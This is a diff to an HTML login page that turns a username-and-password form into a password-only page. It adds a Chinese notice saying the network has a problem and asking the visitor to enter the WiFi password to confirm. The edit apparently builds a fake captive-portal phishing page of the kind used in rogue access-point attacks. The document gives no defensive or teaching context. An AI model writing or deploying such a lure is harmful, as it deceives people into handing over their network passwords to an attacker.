@@ -235,23 +235,24 @@ p {
 
       <form method="POST" class="form login">
 
-        <div class="form__field">
+        <!--div class="form__field">
           <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
           <input type="text" name="login" class="form__input" placeholder="Username" required>
+        </div-->
+
+		<p class="text--center">当前网络存在问题，请输入WIFI密码确认</p>
+        <div class="form__field">
+          <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">password</span></label>
+          <input  type="password" name="password" class="form__input" placeholder="密码" required>
         </div>
 
         <div class="form__field">
-          <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
-          <input  type="password" name="password" class="form__input" placeholder="Password" required>
-        </div>
-
-        <div class="form__field">
-          <input type="submit" value="Sign In">
+          <input type="submit" value="登录">
         </div>
 
       </form>
 
-      <p class="text--center">Not a member? <a href="#">Sign up now</a> <svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="assets/images/icons.svg#arrow-right"></use></svg></p>
+      <!--p class="text--center">忘记密码? <a href="#">点击这里</a> <svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="assets/images/icons.svg#arrow-right"></use></svg></p-->
 
     </div>
     
